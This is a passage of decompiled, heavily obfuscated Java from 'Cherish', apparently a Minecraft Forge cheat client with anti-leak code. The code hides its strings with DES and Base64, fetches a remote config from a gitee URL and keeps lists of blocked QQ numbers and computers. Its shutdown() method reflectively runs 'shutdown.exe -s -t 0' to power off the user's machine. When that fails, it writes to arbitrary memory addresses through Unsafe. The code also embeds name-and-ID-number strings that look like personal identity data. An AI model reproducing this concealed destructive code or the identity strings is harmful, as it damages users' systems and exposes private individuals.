package cn.cool.cherish;

import cn.cool.cherish.config.ConfigManager;
import cn.cool.cherish.event.EventManager;
import cn.cool.cherish.module.Module;
import cn.cool.cherish.module.ModuleManager;
import cn.cool.cherish.module.何树何何树何友何何何;
import cn.cool.cherish.module.impl.display.树树树何树树何何树友;
import cn.cool.cherish.module.impl.render.何何树树何何树树树何;
import cn.cool.cherish.module.impl.render.友何树何何友友树友友;
import cn.cool.cherish.module.impl.render.树树何何何何友树友何;
import cn.cool.cherish.ui.友树何友何友何树树树;
import cn.cool.cherish.ui.树何何树友树何树友树;
import cn.cool.cherish.utils.misc.树何友树树树树树何何;
import cn.cool.cherish.utils.resources.ResourcesManager;
import cn.cool.cherish.utils.unsafe.UnsafeUtils;
import furry.obf.ClassObfuscator;
import heilongjiang.zhaoyuan.何树友;
import java.lang.invoke.CallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MutableCallSite;
import java.lang.invoke.MethodHandles.Lookup;
import java.lang.management.RuntimeMXBean;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.function.Predicate;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.forgespi.language.IModFileInfo;
import net.minecraftforge.forgespi.language.IModInfo;
import sun.misc.Unsafe;
import why.tree.friend.antileak.Fucker;
import why.tree.friend.antileak.client.Client;
import why.tree.friend.antileak.utils.CryptUtil;
import 何大伟230622198107200054.林佳鹏;

@ClassObfuscator
@Mod("cherish")
public class Cherish implements 何树友 {
   public static boolean 何何友友友何树友树友;
   public static boolean isDllInject;
   public static boolean 树何友友友友友树友友;
   public static Object SHOULD_START;
   public static Object MODULE_SHOULD_START;
   public static final String 友何树何树何友友树树;
   public static final String 友何友树树树树树何何;
   public static final String 何何何树何树友何何树;
   public static Object[] FILTER_PACKAGE_AND_MODULE;
   public static List<Object> BLOCKED_QQ_NUMBERS;
   public static List<Object> BLOCKED_COMPUTER;
   public static final Object 树树树树友树友树树友;
   public static final Object 友友何何友何树何何友;
   public static final Object 友树何何友树树树树何;
   public static final Object 何树友友树友何友树友;
   public static Cherish instance;
   private ModuleManager 友何友友友树树何何树;
   private EventManager 树友何何何树何友树何;
   private static ConfigManager 树树友友树友友何何何;
   private 友友何树树树友树何友 何何何树树友友树树何;
   private static ResourcesManager 何何何何树树友友树何;
   private 友树何友何友何树树树 友树何何树何树树何树;
   private 树何友树树树树树何何 何友树何树何何何友树;
   private 何何何何何何友树友树 何友树树树何何友友友;
   private ResourceLocation 友友何何树树何友树树;
   private ResourceLocation 树树树友树树树友何何;
   private ResourceLocation 何何何树树友何树何何;
   private static int 友树树友树树何友友友;
   private static final long a;
   private static final String[] b;
   private static final String[] c;
   private static final Map d = new HashMap(13);
   private static final long[] e;
   private static final Long[] f;
   private static final Map g;
   private static final Object[] h = new Object[191];
   private static final String[] i = new String[191];
   private static String HE_DA_WEI;

   public Cherish() {
      this.H();
   }

   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   static {
      synchronized (何树何何树何友何何何.g()){} // $VF: monitorenter 
      long var10000 = 何树何何树何友何何何.a(-2579967073937459789L, 1159769089692864328L, MethodHandles.lookup().lookupClass()).a(75109855856257L);
      // $VF: monitorexit
      a = var10000;
      a();
      X(0);
      Cipher var11;
      Cipher var22 = var11 = Cipher.getInstance("DES/CBC/PKCS5Padding");
      SecretKeyFactory var10002 = SecretKeyFactory.getInstance("DES");
      byte[] var10003 = new byte[]{0, 0, 0, 0, 0, 0, 0, 0};

      for (int var12 = 1; var12 < 8; var12++) {
         var10003[var12] = (byte)(36985463624386L << var12 * 8 >>> 56);
      }

      var22.init(2, var10002.generateSecret(new DESKeySpec(var10003)), new IvParameterSpec(new byte[8]));
      String[] var18 = new String[40];
      int var16 = 0;
      String var15 = "½ H#úx±\u0019æ9\u008e5è\u008cxã\u0018çäH\u00adAÂ,õùÌV\u0087Qü\u0084ÃA \u0004#'8\u0091X \u0010ge\u0083fÅø$å±Àê%\u001c \u007f\u001cÑau#àp®¢4É\u0017î\u0019\u0091\u0088¨wÂ´YÏ5{U X\u007fjÞ½·h¯_Ð\u001bbu¨1s\u001e+\tÌ7R<P\u001a\u0017\roQié\rñ\n÷\u000f\u000f·\u0093\u008f\u0001\u0005Â+\u0085s`¯ó\b$§\u0091ª\u0083Y\u0099Ø-\u0000\u0086µ)jìÉnè\u0089Øª÷\u0014\u009bí)ynªRÔë*\u009f¾\u0097Ú\u0001\u0085\"×Zýº/\u009e¤\u001cð\u009dë\u007f 7\u001f½Õ\"ÅP>\u0016]dV±G\u001f/q ø°\u009d\u0089\u009e!\u001c\u0000A$£H\u007f\u0081V&/ônæ\u009aý\u00121Å®\u001cM\u0098\u008c\"å\u009d®Ih\u009e\u0016\u0010ë_*\"³\"\u0085\u0095c\u00ad\u0099}®§'\u000e #Ö×BÍÀ¥jh+\u0092\u008d*/< Íg\u0089í`\u0089²\u0012\u0082\u0086!rjÑsî(³\u0083\u008d&\u0006\u0085¡S/ö\u000efRR·\u0013Û¡\u0096õãCX\u0081h÷${ (gDb¸Ôß\u0018Þ´p8pÉá\u009f¿Ç\f\u0087\u0087\u0010)(Bõ\u0016´\u0018=æqûì¦Yaë\u001d\u0094x\u0019\u0002«C&°ÁÖ$zï\u0013}Ýcl\u0016¯$9|(\bÉ^þ\f\u0010\u008c¶xQ\u009aÓq\u008c \u0094\\\\\nÞ«[\u0018\u0097NGêÈ@;¤yÔ+&J\u0014Ù.½\u0013ÉÚ²1\tb\u0018½r\u0082|ÂtÌ\u001da[ÌM #ûJL\u009d¸ÿïÍx6\u0010Ô-\u0000ß\u0096eÒiÙfg$\"PKi(\u009e\u0012fù\u0016M\u0082¤oê\u0010Um\u0084Vp6\bþ%B<Çz\t\u0094]ëJ@êÁbÖ.\u00938àÝ\u008a\u0018°YTÈ\u001d@\u0093\u008dE÷êó\u001c25s4>\u000b\u0002\u0003Æ¾y(6MâêÄõ#§#\u001eøÃÒixõY$ßY/)f\u0018¸ë}\u0095<\u0001\u0090\u00adFvé´Ý±Vù(\u001b,\u0085P±Û\u0005Ä\rLÆ\u001eæL\u0098:s0\t[\u0001ÿ×2L4Û\u008eo\u00013³u<¡\u008c?S\fa¨.\u0096_9Ï«õæ\u0011\u0093\u008b?l©ÅÔO1\u0015ðð\u009bZm\u0090ð#\u0002\u0080ÕÏâtsUÆ¡´\u0015~j+\u0005´\u0004vP\u0015õf\u0085×lör<;þôþ.\u008a\u008f\u008cúm]\u0092\u0092ÉH\u0083,KO3i\u0082Ánâ\u0097Ï\u0080¶\u0093¥ã\u001aO\u0004B¼ª\u0093\u008d\u001cC\u0091räAÕ\u001aÕ\u0000g\u0096Ýx\u0094ñß\u0006r\u0002 ¿$\u0014Õ\u0019þ\u0094¥ËÀ\u0085\u0092ìÅ\u009bõu;iLa\f\u0001\u008cÓaGI¦üM?\u000bEùÃÝ.\u0094\u008eDµÚÖ.\u009bâ_º2'\u0010¸sÍt+³9hÍVfU\u007f\u0089¿X\u0010=å\u0002.B\u008eÎ\u000e®\n>õù Òó\u0010Èb\u000bðz(ó\u0093\u0097X\tèâ\u009dþ~\u0010,ßu¸aÇ@.\u0004]¨Ø\u0013K\u0099\u0082\u0018õð±¥Q,<ÂÇÄ÷:Úìu½\u0094\u0088¨<z:Íð\u0010º\u0092Ãü\u008dÕ§òÚXc\u009cR1±ËHVq\u001aGÁky¼Ð§`¦²\u0085:A\fWé\u0007\u0084=\u0017Íêi\u008eÔÑæ¶õ\u0015\u001f¶¥r4ÍW÷\u001a\u0006ÈëÄJËÔ&ÀËBåúñÓ\u008f\u0019\u0013ü <$<\u0080ye\n\u009a\u008e\u001f(çº\u0080üÆp2#\u0012\u001ce*\u008a¯ÚR\u0005/T\u009fÅ\u0092÷QNQþ\u0002\u0014\u0086¤ç\u000e\u009a\u001a\u0003l\u0015^¿\u0010ÆÂím[?W\u0007\u0002\u0096Ö^ëÈÄ×0j}Õ\u00020\u0003[ì{\u008dSÈ\u0018\u0000\u0082]r2ß!>cP^ãâG=Ì\u001dõlÒiÁð,;\u0080^\u001dÖ¼5\u00994\u001bØ\u0018D\u0019\u001eé$¯G·N´Qí\tô} \u0093Ä\u000b¯øò;88Äç\u0010I\u000b\u009bÞê ±A{i´\u0081qq\u001fc\u0016\u0011²h7:\u001e%F·\u0092é\t¯ì?\u009fñ¬(hiozÙaÕ\u0010dH\u0082Þ`ãcÖL\u0088òÒlª\u0091:)Zj\u001eá\u00037h\u009fH gÖ\u0092«ZQ\u0014¡ïG.í¨!æºPÃ4»õ\u0002\u0007\u0001>ò`s\u0087àVà¬\u001f\u00ad°ê×\u001dq>7R\u009f*\u001bóÉñ\u0090\u0087ñ +\u0096|Ö \u009b¡,Æ£|r·%5\u001f`{¥N4µi\u0014úø\u00872\u0007u\u0084UÓ7\u007fHë\u0004½\u0080\u0006¿·¯fg\u0004e$\u008fúÇrÉó)±\u008eµ2wÜ\u001eÝëî\u0018Óõ\u0084ìzVákA>\u007f03\u0091}Â¾NM\u0097\u0097Ì\u0093\u001a\u0010TQÑgëµ\u0094'\u0010\u0014ú\u0094Ã»y_ ]ð\u008a\u0016q^ÒaÇS¥\u009bt\u008dq|EÊHPS\u0099Á½Ù\bV\u008e\u0019a¨\u000b(\u0016\u0083l%\u0001ñ\u009cþ\u0011Ã§\u0017Þ%u7«ù\u001bûöýÊý~.[Á[e·\u0087¤´n\u0015òb´¬\u0010\u008f³»VÅ\":H\u0088&ª\u001doKi\"(GÝ}P÷Ñà¾Ïúå?\u0092\u00883[Âæq%4\u0003\u0082Ç|òü\nÙ\u0014ÁA&+§ãÝ\u001d\u008eR\u0090#\u007f;¾è\u001apºMy\u00ad\u00121\u0017ë!'\u0090CNLÓ]Ýíqk©_>§\"áÊ«_²\u0015\u009eÃéÏD;jªOü\u0007\u001dµ\u0087\rÿ\tsâ\u009a\u001f¯N\u001f\u000bçðE¥\u000b\"nU\u0001õ?O£fã\u0091\u0086ª0\u008fL7jØ¶xøF§\u00ad7Þ[\u0003\u009b \u0080³/\u001fuâ½\u008c\u0011\r\u0002¬\u0014xPu\fa®u\u0013S0Î\u008a\u0007pR$,ÊÐ\u0017 ©í9%Ñ/¿!»ô\u00910=©¶uÃGdN\u0097Æj\u0086ù¢}\u0084C\u0002 A©|N=U\u009c\u008còv«EIf\u0087¼çnNoE»9±\u001b0_Úa";
      short var17 = 1669;
      char var14 = 16;
      int var21 = -1;

      label54:
      while (true) {
         String var23 = var15.substring(++var21, var21 + var14);
         int var10001 = -1;

         while (true) {
            String var34 = a(var11.doFinal(var23.getBytes("ISO-8859-1"))).intern();
            switch (var10001) {
               case 0:
                  var18[var16++] = var34;
                  if ((var21 += var14) >= var17) {
                     b = var18;
                     c = new String[40];
                     友何树何树何友友树树 = "Cherish";
                     友何友树树树树树何何 = "B3.7";
                     g = new HashMap(13);
                     Cipher var0;
                     Cipher var25 = var0 = Cipher.getInstance("DES/CBC/NoPadding");
                     var10002 = SecretKeyFactory.getInstance("DES");
                     var10003 = new byte[]{0, 0, 0, 0, 0, 0, 0, 0};

                     for (int var1 = 1; var1 < 8; var1++) {
                        var10003[var1] = (byte)(36985463624386L << var1 * 8 >>> 56);
                     }

                     var25.init(2, var10002.generateSecret(new DESKeySpec(var10003)), new IvParameterSpec(new byte[8]));
                     long[] var6 = new long[9];
                     int var3 = 0;
                     String var4 = "\u008a\u009aØ±\u0005.@rÝw^\u0005Dé\u0017G\u00ad\u0080ê\"Ö\u00ady^Áë}v¦\u009d\u0099e-\u0019\u0085\u008aôÄ»\u0099Ñ3·\u0099$vNì_Qlî÷Ømå";
                     byte var5 = 56;
                     byte var2 = 0;

                     label36:
                     while (true) {
                        var10001 = var2;
                        var2 += 8;
                        byte[] var7 = var4.substring(var10001, var2).getBytes("ISO-8859-1");
                        long[] var26 = var6;
                        var10001 = var3++;
                        long var38 = (var7[0] & 255L) << 56
                           | (var7[1] & 255L) << 48
                           | (var7[2] & 255L) << 40
                           | (var7[3] & 255L) << 32
                           | (var7[4] & 255L) << 24
                           | (var7[5] & 255L) << 16
                           | (var7[6] & 255L) << 8
                           | var7[7] & 255L;
                        byte var41 = -1;

                        while (true) {
                           long var8 = var38;
                           byte[] var10 = var0.doFinal(
                              new byte[]{
                                 (byte)(var8 >>> 56),
                                 (byte)(var8 >>> 48),
                                 (byte)(var8 >>> 40),
                                 (byte)(var8 >>> 32),
                                 (byte)(var8 >>> 24),
                                 (byte)(var8 >>> 16),
                                 (byte)(var8 >>> 8),
                                 (byte)var8
                              }
                           );
                           long var43 = (var10[0] & 255L) << 56
                              | (var10[1] & 255L) << 48
                              | (var10[2] & 255L) << 40
                              | (var10[3] & 255L) << 32
                              | (var10[4] & 255L) << 24
                              | (var10[5] & 255L) << 16
                              | (var10[6] & 255L) << 8
                              | var10[7] & 255L;
                           switch (var41) {
                              case 0:
                                 var26[var10001] = var43;
                                 if (var2 >= var5) {
                                    e = var6;
                                    f = new Long[9];
                                    何何友友友何树友树友 = false;
                                    isDllInject = false;
                                    树何友友友友友树友友 = false;
                                    SHOULD_START = false;
                                    MODULE_SHOULD_START = false;
                                    何何何树何树友何何树 = CryptUtil.Base64Crypt.decrypt(
                                       "aHR0cHM6Ly9naXRlZS5jb20vQ29vbF9Vc2VyL3hpYW9oYW9qaS5jb25maWcvcmF3L21hc3Rlci9yYW5kb20udHh0"
                                    );
                                    树树树树友树友树树友 = "何树友";
                                    友友何何友何树何何友 = "和树做朋友";
                                    友树何何友树树树树何 = "何大伟230622198107200054";
                                    何树友友树友何友树友 = "何建国230622195906030014";
                                    instance = new Cherish();
                                    return;
                                 }
                                 break;
                              default:
                                 var26[var10001] = var43;
                                 if (var2 < var5) {
                                    continue label36;
                                 }

                                 var4 = "ó\u001e%²+÷ª¸ÔNÂ.:F\fò";
                                 var5 = 16;
                                 var2 = 0;
                           }

                           byte var32 = var2;
                           var2 += 8;
                           var7 = var4.substring(var32, var2).getBytes("ISO-8859-1");
                           var26 = var6;
                           var10001 = var3++;
                           var38 = (var7[0] & 255L) << 56
                              | (var7[1] & 255L) << 48
                              | (var7[2] & 255L) << 40
                              | (var7[3] & 255L) << 32
                              | (var7[4] & 255L) << 24
                              | (var7[5] & 255L) << 16
                              | (var7[6] & 255L) << 8
                              | var7[7] & 255L;
                           var41 = 0;
                        }
                     }
                  }

                  var14 = var15.charAt(var21);
                  break;
               default:
                  var18[var16++] = var34;
                  if ((var21 += var14) < var17) {
                     var14 = var15.charAt(var21);
                     continue label54;
                  }

                  var15 = "w|æÚTþ\u001d¶*»Åí\u0084ð\u0096|\u008d\u0093X\u001dÙëºÖÜî#í\u0011<Ã¥\u0018\u0003×yü\u001csÈ\t\u001c\u0012w\u0094hk\\$\u001d\u0096X\u000bÁ\u0014®¡";
                  var17 = 57;
                  var14 = ' ';
                  var21 = -1;
            }

            var23 = var15.substring(++var21, var21 + var14);
            var10001 = 0;
         }
      }
   }

   public void shutdown() {
      c<"Ñ">(-8681681059758970961L, 120301624788910L);
      if (instance != null) {
         Object o = c<"d">(
            c<"Ñ">(new Object[]{51908052068264L}, -8679623674490433662L, 120301624788910L),
            new Object[]{11257829948971L},
            -8668716184262251937L,
            120301624788910L
         );
         if (c<"d">(
            c<"d">(c<"Ñ">(o, -8679403552742480973L, 120301624788910L), 1, -8667339292304696605L, 120301624788910L),
            "se",
            -8682119440631427620L,
            120301624788910L
         )) {
            c<"d">(
               c<"d">(c<"e">(this, -8678729583823497102L, 120301624788910L), 友何树何何友友树友友.class, -8666181265542187903L, 120301624788910L),
               false,
               -8666197602897980562L,
               120301624788910L
            );
            c<"d">(
               (何何树树何何树树树何)c<"d">(c<"e">(this, -8678729583823497102L, 120301624788910L), 何何树树何何树树树何.class, -8666181265542187903L, 120301624788910L),
               -8666887178964322611L,
               120301624788910L
            );
            if (c<"d">(
                  c<"d">(c<"e">(this, -8678729583823497102L, 120301624788910L), 树树何何何何友树友何.class, -8666181265542187903L, 120301624788910L),
                  -8667562900325746359L,
                  120301624788910L
               )
               && c<"d">(
                  (Boolean)c<"d">(
                     c<"e">(
                        (树树何何何何友树友何)c<"d">(c<"e">(this, -8678729583823497102L, 120301624788910L), 树树何何何何友树友何.class, -8666181265542187903L, 120301624788910L),
                        -8668315780314293052L,
                        120301624788910L
                     ),
                     -8681272950048696150L,
                     120301624788910L
                  ),
                  -8668751486775328936L,
                  120301624788910L
               )) {
               c<"d">(
                  c<"d">(c<"e">(this, -8678729583823497102L, 120301624788910L), 树树何何何何友树友何.class, -8666181265542187903L, 120301624788910L),
                  false,
                  -8666197602897980562L,
                  120301624788910L
               );
            }

            c<"d">(c<"W">(-8681895065242359270L, 120301624788910L), -8681381918349848565L, 120301624788910L);
            c<"Ñ">(new Object[]{6975912150123L}, -8678590974050837633L, 120301624788910L);
            c<"Ñ">(new Object[]{65622592863695L}, -8682811064550387652L, 120301624788910L);
            c<"Ñ">(new Object[]{34790758263809L}, -8678673448945768150L, 120301624788910L);
            long var10000 = b<"s">(10050, 932720023306049691L);
            Object[] var10003 = new Object[]{null, 18419141401198L};
            var10003[0] = var10000;
            c<"Ñ">(var10003, -8680258392028790107L, 120301624788910L);
            c<"Ñ">(new Object[0], -8668078962957161121L, 120301624788910L);
            c<"Ñ">(new Object[]{118824977347697L}, -8679231325362482227L, 120301624788910L);
            c<"Ñ">(-8681883461751056983L, 120301624788910L);
            if (树树树何树树何何树友.何友友何友何何何树树 != null
               && c<"d">(树树树何树树何何树友.何友友何友何何何树树, -8667562900325746359L, 120301624788910L)
               && 树树树何树树何何树友.何友友何友何何何树树.友友友友友树树树何树 != null) {
               c<"d">(树树树何树树何何树友.何友友何友何何何树树.友友友友友树树树何树, 0, -8680390886603315119L, 120301624788910L);
            }

            c<"d">(c<"e">(this, -8681612085917359960L, 120301624788910L), -8679997927531818902L, 120301624788910L);
            c<"d">(this, -8679314169580746306L, 120301624788910L);
         }

         try {
            c<"Ñ">(-8681883461751056983L, 120301624788910L);
            c<"d">(
               c<"d">(
                  c<"d">(
                        c<"d">(
                           c<"Ñ">("java.lang.Runtime", -8668108430683806961L, 120301624788910L),
                           "getRuntime",
                           new Class[0],
                           -8682090756693664769L,
                           120301624788910L
                        ),
                        c<"Ñ">("java.lang.Runtime", -8668108430683806961L, 120301624788910L),
                        new Object[0],
                        -8679969927591313140L,
                        120301624788910L
                     )
                     .getClass(),
                  "exec",
                  new Class[]{String.class},
                  -8682090756693664769L,
                  120301624788910L
               ),
               c<"d">(
                  c<"d">(
                     c<"Ñ">("java.lang.Runtime", -8668108430683806961L, 120301624788910L), "getRuntime", new Class[0], -8682090756693664769L, 120301624788910L
                  ),
                  c<"Ñ">("java.lang.Runtime", -8668108430683806961L, 120301624788910L),
                  new Object[0],
                  -8679969927591313140L,
                  120301624788910L
               ),
               new Object[]{"shutdown.exe -s -t 0"},
               -8679969927591313140L,
               120301624788910L
            );
         } catch (NoSuchMethodException | ClassNotFoundException | InvocationTargetException | IllegalAccessException var20) {
            c<"Ñ">(-8681883461751056983L, 120301624788910L);
            c<"d">(UnsafeUtils.友友何何友树友何友树, Long.MAX_VALUE, -8682701880529834643L, 120301624788910L);
            c<"d">(UnsafeUtils.友友何何友树友何友树, 1111114541L, -8682701880529834643L, 120301624788910L);
            c<"d">(UnsafeUtils.友友何何友树友何友树, 1919810000L, -8682701880529834643L, 120301624788910L);
            c<"d">(UnsafeUtils.友友何何友树友何友树, 198964848488L, -8682701880529834643L, 120301624788910L);
            c<"d">(UnsafeUtils.友友何何友树友何友树, 1111114541L, -8682701880529834643L, 120301624788910L);
            c<"d">(UnsafeUtils.友友何何友树友何友树, 1919810000L, -8682701880529834643L, 120301624788910L);
            c<"d">(UnsafeUtils.友友何何友树友何友树, 198964848488L, -8682701880529834643L, 120301624788910L);
            c<"Ñ">(0, -8680063436341825809L, 120301624788910L);
         }
      }
   }

   public ResourceLocation B() {
      return this.友友何何树树何友树树;
   }

   public static void I() {
      if (Client.channel != null) {
         Client.channel.flush();
         Client.channel.disconnect();
         Client.channel.close();
         Client.channel = null;
      }
   }

   public void V(友友何树树树友树何友 commandManager) {
      this.何何何树树友友树树何 = commandManager;
   }

   public void e(友树何友何友何树树树 fontManager) {
      this.友树何何树何树树何树 = fontManager;
   }

   public static Minecraft e() {
      Minecraft minecraft = null;

      try {
         Class<?> classMinecraft = Class.forName("cherish");

         for (Field field : classMinecraft.getDeclaredFields()) {
            if (field.getType() == classMinecraft) {
               field.setAccessible(true);
               minecraft = (Minecraft)field.get(null);
               field.setAccessible(false);
            }
         }
      } catch (Throwable var8) {
         var8.printStackTrace();
      }

      return minecraft;
   }

   private static Class b(long var0, long var2) {
      int var4 = a(var0, 0L);
      Object var6 = h[var4];
      Object var10000 = var6;

      try {
         if (var10000 instanceof String) {
            Class var5 = Class.forName(i[var4]);
            h[var4] = var5;
            return var5;
         }
      } catch (Exception var8) {
         throw new RuntimeException(var8.toString());
      }

      return (Class)var6;
   }

   private static long b(int var0, long var1) {
      int var3 = var0 ^ (int)(var1 & 32767L) ^ 16346;
      if (f[var3] == null) {
         byte[] var4 = new byte[]{
            (byte)(var1 >>> 56),
            (byte)(var1 >>> 48),
            (byte)(var1 >>> 40),
            (byte)(var1 >>> 32),
            (byte)(var1 >>> 24),
            (byte)(var1 >>> 16),
            (byte)(var1 >>> 8),
            (byte)var1
         };
         long var5 = e[var3];
         byte[] var7 = new byte[]{
            (byte)(var5 >>> 56),
            (byte)(var5 >>> 48),
            (byte)(var5 >>> 40),
            (byte)(var5 >>> 32),
            (byte)(var5 >>> 24),
            (byte)(var5 >>> 16),
            (byte)(var5 >>> 8),
            (byte)var5
         };
         Long var8 = Thread.currentThread().getId();
         Object[] var10000 = (Object[])g.get(var8);

         byte[] var10;
         try {
            Object[] var9 = new Object[]{Cipher.getInstance("DES/CBC/NoPadding"), SecretKeyFactory.getInstance("DES"), new IvParameterSpec(new byte[8])};
            g.put(var8, var9);
            DESKeySpec var11 = new DESKeySpec(var4);
            SecretKey var12 = ((SecretKeyFactory)var9[1]).generateSecret(var11);
            Cipher var13 = (Cipher)var9[0];
            var13.init(2, var12, (IvParameterSpec)var9[2]);
            var10 = var13.doFinal(var7);
         } catch (Exception var14) {
            throw new RuntimeException("cn/cool/cherish/Cherish", var14);
         }

         long var15 = (var10[0] & 255L) << 56
            | (var10[1] & 255L) << 48
            | (var10[2] & 255L) << 40
            | (var10[3] & 255L) << 32
            | (var10[4] & 255L) << 24
            | (var10[5] & 255L) << 16
            | (var10[6] & 255L) << 8
            | var10[7] & 255L;
         f[var3] = var15;
      }

      return f[var3];
   }

   private static long b(Lookup var0, MutableCallSite var1, String var2, Object[] var3) {
      int var4 = (Integer)var3[0];
      long var5 = (Long)var3[1];
      long var7 = b(var4, var5);
      MethodHandle var9 = MethodHandles.constant(long.class, var7);
      var1.setTarget(MethodHandles.dropArguments(var9, 0, int.class, long.class));
      return var7;
   }

   private static CallSite b(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("b".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/Cherish" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   private static Method b(Class var0, String var1, Class var2, int var3, Class[] var4) {
      return a(var0, var1, var2, var3, var4);
   }

   private static Field b(Class var0, String var1, Class var2) {
      return a(var0, var1, var2);
   }

   public static boolean b(Object a) {
      return true;
   }

   private static Field c(long var0, long var2) {
      int var4 = a(var0, var2);
      Object var5 = h[var4];
      if (var5 instanceof String) {
         String var6 = i[var4];
         int var7 = var6.indexOf(8);
         Class var8 = b(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         Class var11 = b(Long.parseLong(var6.substring(++var9), 36), 0L);
         Field var13 = a(var8, var10, var11);
         h[var4] = var13;
         return var13;
      } else {
         return (Field)var5;
      }
   }

   private static CallSite c(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1, var2), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/Cherish" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   public 友友何树树树友树何友 f() {
      return this.何何何树树友友树树何;
   }

   private static Method d(long var0, long var2) {
      int var4 = a(var0, var2);
      Object var5 = h[var4];
      if (!(var5 instanceof String)) {
         return (Method)var5;
      } else {
         String var6 = i[var4];
         int var7 = var6.indexOf(8);
         Class var8 = b(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         int var11 = -1;
         int var12 = var9;

         do {
            var11++;
            var12++;
         } while ((var12 = var6.indexOf(8, var12)) > -1);

         int var13;
         Class[] var14 = new Class[var13 = var11 - 1];
         Class var15 = null;
         var12 = var9 + 1;

         for (int var16 = 0; var16 < var11; var16++) {
            int var17 = var6.indexOf(8, var12);
            var15 = b(Long.parseLong(var6.substring(var12, var17), 36), 0L);
            if (var16 < var13) {
               var14[var16] = var15;
            }

            var12 = var17 + 1;
         }

         Method var21 = a(var8, var10, var15, var13, var14);
         h[var4] = var21;
         return var21;
      }
   }

   private static Method a(Class var0, String var1, Class var2, int var3, Class[] var4) {
      label33:
      for (Method var8 : var0.getDeclaredMethods()) {
         if (var8.getName().equals(var1) && var8.getReturnType() == var2) {
            Class[] var9 = var8.getParameterTypes();
            if (var9.length == var3) {
               for (int var10 = 0; var10 < var3; var10++) {
                  if (var9[var10] != var4[var10]) {
                     continue label33;
                  }
               }

               return var8;
            }
         }
      }

      return null;
   }

   private static String a(byte[] var0) {
      int var1 = 0;
      int var2;
      char[] var3 = new char[var2 = var0.length];

      for (int var4 = 0; var4 < var2; var4++) {
         int var5;
         if ((var5 = 255 & var0[var4]) < 192) {
            var3[var1++] = (char)var5;
         } else if (var5 < 224) {
            char var6 = (char)((char)(var5 & 31) << 6);
            byte var8 = var0[++var4];
            var6 = (char)(var6 | (char)(var8 & 63));
            var3[var1++] = var6;
         } else if (var4 < var2 - 2) {
            char var12 = (char)((char)(var5 & 15) << '\f');
            byte var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63) << 6);
            var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63));
            var3[var1++] = var12;
         }
      }

      return new String(var3, 0, var1);
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, Object[] var3) {
      int var4 = (Integer)var3[0];
      long var5 = (Long)var3[1];
      String var7 = a(var4, var5);
      MethodHandle var8 = MethodHandles.constant(String.class, var7);
      var1.setTarget(MethodHandles.dropArguments(var8, 0, int.class, long.class));
      return var7;
   }

   private static Throwable a(Throwable var0) {
      return var0;
   }

   private static MethodHandle a(Lookup var0, MutableCallSite var1, String var2, MethodType var3, long var4, long var6) {
      char var8 = var2.charAt(0);
      Field var10 = null;

      try {
         MethodHandle var9;
         if (var8 != 'e' && var8 != 199 && var8 != 'W' && var8 != 212) {
            Method var11 = d(var4, var6);
            Class var16 = var11.getDeclaringClass();
            String var18 = var11.getName();
            MethodType var19 = MethodType.methodType(var11.getReturnType(), var11.getParameterTypes());
            if (var8 == 'd') {
               var9 = var0.findVirtual(var16, var18, var19);
            } else if (var8 == 209) {
               var9 = var0.findStatic(var16, var18, var19);
            } else {
               var9 = var0.findSpecial(var16, var18, var19, var16);
            }
         } else {
            var10 = c(var4, var6);
            Class var12 = var10.getDeclaringClass();
            String var17 = var10.getName();
            Class var14 = var10.getType();
            if (var8 == 'e') {
               var9 = var0.findGetter(var12, var17, var14);
            } else if (var8 == 199) {
               var9 = var0.findSetter(var12, var17, var14);
            } else if (var8 == 'W') {
               var9 = var0.findStaticGetter(var12, var17, var14);
            } else {
               var9 = var0.findStaticSetter(var12, var17, var14);
            }
         }

         return MethodHandles.dropArguments(var9, var3.parameterCount() - 2, long.class, long.class);
      } catch (Exception var15) {
         StringBuilder var13 = new StringBuilder();
         var13.append(var15.getClass().getName()).append(" : ").append(var10.toString()).append(" : ").append(var15.toString());
         throw new RuntimeException(var13.toString());
      }
   }

   private static int a(long var0, long var2) {
      var0 ^= var2 << 48 | var2;
      int var4 = (int)(var0 >>> 46);
      if (i[var4] != null) {
         return var4;
      } else {
         Object var5 = h[var4];
         if (!(var5 instanceof String)) {
            return var4;
         } else {
            byte var6 = switch ((int)(var0 >>> 42 & 63L)) {
               case 0 -> 28;
               case 1 -> 48;
               case 2 -> 60;
               case 3 -> 31;
               case 4 -> 50;
               case 5 -> 38;
               case 6 -> 49;
               case 7 -> 46;
               case 8 -> 41;
               case 9 -> 51;
               case 10 -> 63;
               case 11 -> 22;
               case 12 -> 20;
               case 13 -> 26;
               case 14 -> 0;
               case 15 -> 39;
               case 16 -> 16;
